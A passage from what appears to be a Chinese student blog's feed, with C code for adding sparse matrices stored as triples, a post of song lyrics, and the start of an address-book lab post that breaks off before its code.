class="number">2</span>=<span class="number">106</span></span><br><span class="line">A[<span class="number">0</span>][<span class="number">1</span>][<span class="number">2</span>]按列优先方式在内存的储储地址为：<span class="number">100</span>+<span class="number">2</span>*<span class="number">6</span>+<span class="number">1</span>*<span class="number">3</span>+<span class="number">0</span>*<span class="number">8</span>=<span class="number">115</span> </span><br></pre></td></tr></table></figure><h2 id="6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。"><a href="#6-已知两个-稀疏矩阵-A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用-三元组-表示。" class="headerlink" title="6. 已知两个 稀疏矩阵 A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 三元组 表示。"></a>6. 已知两个 <code>稀疏矩阵</code> A和B，其行数和列数均对应相等，编写一个函数，计算A和B之和，假设稀疏矩阵采用 <code>三元组</code> 表示。</h2><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> m,n; <span class="comment">//稀疏矩阵 行数、列数、非零元素的个数</span></span><br><span class="line">&#125;matrix;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> spmatrix[<span class="number">100</span>][<span class="number">3</span>];</span><br><span class="line">spmatrix c;</span><br><span class="line"></span><br><span class="line"><span class="comment">//三元组：矩阵相加</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(spmatrix a,spmatrix b,spmatrix c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,r;</span><br><span class="line">    i = j = k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=a[<span class="number">0</span>][<span class="number">2</span>]&amp;&amp;j&lt;=b[<span class="number">0</span>][<span class="number">2</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][<span class="number">0</span>] &lt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>]&lt;b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">             c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">             c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">             c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">             i++;k++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] &gt; b[j][<span class="number">0</span>] || (a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; a[i][<span class="number">1</span>] &gt; b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">                c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">                c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">                c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">                j++;k++;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i][<span class="number">0</span>] == b[j][<span class="number">0</span>] &amp;&amp; (a[i][<span class="number">1</span>] == b[j][<span class="number">1</span>]))&#123;</span><br><span class="line">            c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>]; </span><br><span class="line">            c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">            c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>]+b[j][<span class="number">2</span>];</span><br><span class="line">            i++;j++;</span><br><span class="line">            <span class="keyword">if</span>(c[k][<span class="number">2</span>] != <span class="number">0</span>) k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt;= b[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=b[j][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=b[j][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=b[j][<span class="number">2</span>];</span><br><span class="line">        j++;k++; </span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">while</span>(i &lt;= a[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        c[k][<span class="number">0</span>]=a[i][<span class="number">0</span>];</span><br><span class="line">        c[k][<span class="number">1</span>]=a[i][<span class="number">1</span>];</span><br><span class="line">        c[k][<span class="number">2</span>]=a[i][<span class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将普通矩阵存储转换成 三元组 的 存储结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_matrix</span><span class="params">(matrix *A,spmatrix B)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; A-&gt;m; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; A-&gt;n; j++)</span><br><span class="line">            <span class="keyword">if</span>(A-&gt;data[i][j] != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                B[k][<span class="number">0</span>] = i;</span><br><span class="line">                B[k][<span class="number">1</span>] = j;</span><br><span class="line">                B[k][<span class="number">2</span>] = A-&gt;data[i][j];</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">0</span>] = A-&gt;m;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">1</span>] = A-&gt;n;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">2</span>] = k<span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;三元组矩阵 展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= B[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,B[i][<span class="number">0</span>],B[i][<span class="number">1</span>],B[i][<span class="number">2</span>]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> r,<span class="keyword">int</span> w,matrix *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入数据：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">            s-&gt;data[i][j] = data;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;矩阵展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,s-&gt;data[i][j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    s-&gt;m = r;</span><br><span class="line">    s-&gt;n = w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    matrix p,q;</span><br><span class="line">    spmatrix a,b,c;</span><br><span class="line">    <span class="keyword">int</span> r,w,i;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入矩阵的 行 与 列：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;r,&amp;w);</span><br><span class="line">    create(r,w,&amp;p);</span><br><span class="line">    create(r,w,&amp;q);</span><br><span class="line">    change_matrix(&amp;p,a);</span><br><span class="line">    change_matrix(&amp;q,b);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    add(a,b,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行加法运算后的 三元组矩阵 展示：\n&quot;</span>); </span><br><span class="line">    <span class="keyword">while</span>(i &lt;= c[<span class="number">0</span>][<span class="number">2</span>])&#123; </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,c[i][<span class="number">0</span>],c[i][<span class="number">1</span>],c[i][<span class="number">2</span>]);</span><br><span class="line">      i++;</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/9rquXIPgvZ8wTYm.png" alt="image-20211022203244329"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>像真的一样</title>
    <link href="https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/"/>
    <id>https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/</id>
    <published>2021-10-15T09:01:08.000Z</published>
    <updated>2021-10-15T09:05:02.271Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你习惯 可能会幸福的预感</p><p>你期盼 等暧昧过完 能改写身份这一栏</p><p>你鼻酸 就算都与你无关</p><p>他心烦 你跟着想要呐喊</p><p>恋人们的手说放就放</p><p>知己就没分手的情况</p><p>能在彼此身旁</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p>他清场 他怯场 他离场 你都是暖场</p><p>边拐弯 打听关于爱的答案</p><p>边感叹 感情的艰难 却对感情避而不谈</p><p>另一半 若像是太阳一般</p><p>天一寒 怎么向你来取暖</p><p>恋人们的手说放就放</p><p>遗憾转身就遗忘</p><p>你还在他身旁</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p>他清场 他怯场 他离场 你都是暖场</p><p>消音的话 只会更强化 不能没有他</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p><strong>他清场 他怯场 他离场 你都是暖场</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构第一次实验-简易通讯录</title>
    <link href="https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/"/>
    <id>https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/</id>
    <published>2021-10-15T08:57:15.000Z</published>
    <updated>2021-10-15T09:04:53.240Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="数据结构第一次实验-—-简易通讯录"><a href="#数据结构第一次实验-—-简易通讯录" class="headerlink" title="数据结构第一次实验 — 简易通讯录"></a>数据结构第一次实验 — 简易通讯录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span 